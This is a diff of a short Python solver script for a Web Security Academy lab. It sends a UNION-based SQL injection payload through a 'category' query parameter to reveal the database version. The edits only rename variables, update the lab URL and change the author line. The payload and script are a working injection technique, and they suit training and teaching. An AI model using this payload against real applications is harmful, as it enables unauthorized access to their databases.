@@ -1,6 +1,6 @@
 ##################################################################################
 #
-# Author: Ahmed Elqalawii
+# Author: Ahmed Elqalawy (@elqal3awii)
 #
 # Date: 16/9/2023
 #
@@ -21,14 +21,14 @@ from colorama import Fore
 #########
 # Main
 #########
-url = "https://0aed00c10379c81a830b55df0088004d.web-security-academy.net" # change this url to your lab
+url = "https://0ae20072037dfc2a83f19dc1005a0085.web-security-academy.net" # change this url to your lab
 try:
-    # the payload to inject
+    # payload to return the database version
     payload = "' UNION SELECT @@version, null-- -"
     # fetch the page with the injected payload
-    inject = requests.get(f"{url}/filter?category={payload}")
+    injection = requests.get(f"{url}/filter?category={payload}")
     print(Fore.WHITE + "1. Injecting payload in 'category' query parameter.. " + Fore.GREEN + "OK")
-    if inject.status_code == 200:
+    if injection.status_code == 200:
         print(Fore.WHITE + "2. Retrieving database version in the response.. " + Fore.GREEN + "OK")
         print(
             Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")
